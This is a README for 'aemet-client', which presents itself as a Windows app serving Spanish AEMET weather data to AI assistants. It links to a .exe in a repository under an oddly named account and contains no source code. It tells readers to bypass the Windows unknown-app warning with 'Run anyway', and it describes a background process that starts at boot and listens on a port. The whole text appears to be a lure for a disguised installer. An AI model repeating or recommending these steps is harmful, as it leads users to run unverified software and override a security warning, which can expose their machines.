# 🌦️ aemet-client - Bring Spanish weather data to apps

[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/Alysiadeceptive64/aemet-client/releases)

This application connects your computer to official weather data from Spain. It provides current conditions, forecasts, and radar maps. You can use this data inside AI tools like Claude Desktop, Cursor, or Windsurf. Developers can also use the code directly in their own projects to display weather information. Aemet-client acts as a bridge between official government data and the tools you use every day.

## 📥 How to download the software

To begin, you need the official installer. Visit the page below to view all available files for your system.

[Download the aemet-client installer](https://github.com/Alysiadeceptive64/aemet-client/releases)

1. Open the link above in your web browser.
2. Look for the section titled Latest. 
3. Select the file ending in .exe for Windows.
4. Save the file to your Downloads folder.

## ⚙️ Setting up on Windows

Once the file finishes downloading, follow these steps to prepare your system.

1. Double-click the downloaded file in your folder.
2. A window from Windows warns you about unknown apps. Click More info, then click Run anyway.
3. Follow the sequence of prompts on your screen.
4. Choose a location on your hard drive to store the app files.
5. Click Install to finish the process.

The application does not require complex configuration. It runs in the background. It listens for requests from your other programs. This allows apps like Claude or Cursor to see weather updates in real time.

## 🛠️ Using the weather tools

After the installation completes, the tool starts automatically when you restart your computer. You verify it works by checking the Windows Task Manager. Look for the process named aemet-client. If you see it, the tool is ready to provide weather data to your AI assistants.

To connect this to an AI tool, you point the AI software to the local address where this tool runs. Most users locate this in the configuration settings of their AI editor under the tools or servers tab. Input the local path so your assistant receives updates for any city in Spain. The tool automatically fetches data from the national weather agency. You do not need to manually refresh or update the information.

## 📋 System requirements

Your computer must meet these basic standards to run the software smoothly.

- Windows 10 or Windows 11.
- An active internet connection to download weather data.
- At least 200 MB of free disk space.
- A current installation of the AI software you intend to pair with the tool, such as Claude Desktop.

Ensure your Windows system receives all recent security updates. Old versions of Windows might block external connections required for the weather service to function.

## 🔍 Troubleshooting common issues

If the weather data fails to load, check these common causes.

- Firewall settings: Sometimes security software blocks local communication. Verify that your firewall allows the app to send and receive data.
- Internet connectivity: The service requires a stable link to the AEMET servers. If your internet drops, the weather data remains stuck on the last known update.
- Software versions: Ensure you use the latest release from the repository. Old versions lose contact with current data sources as the agency updates their API.
- Port conflicts: The tool uses a standard port to talk to your AI assistants. If another program uses that same port, the tool starts but fails to connect. Restart your computer to resolve this conflict.

## ℹ️ Understanding the data sources

This tool pulls information from the AEMET OpenData API. This is the official source for weather information in Spain. You receive the exact same data shown on the government weather website. This includes wind speeds, precipitation estimates, and temperature maps. The integration translates this complex weather language into simple text that your AI tool reads easily.

You can request updates for specific provinces or regions. The tool keeps a local cache. This prevents your computer from requesting data too often, which helps the official servers run faster for everyone. If you need data for a specific city, you specify the location in your AI chat prompt. The assistant sends that request through the aemet-client, which fetches the correct details.

## 🛡️ Privacy and safety

The application runs locally on your machine. All data requests happen between your computer and the AEMET servers. No third party monitors your weather queries. The code does not track your location or personal habits. It only functions as a middleman to retrieve public weather information. 

You remain in control of the software at all times. Stop the background process through the task manager if you no longer wish to use the weather features. Deleting the folder remove all files from your system.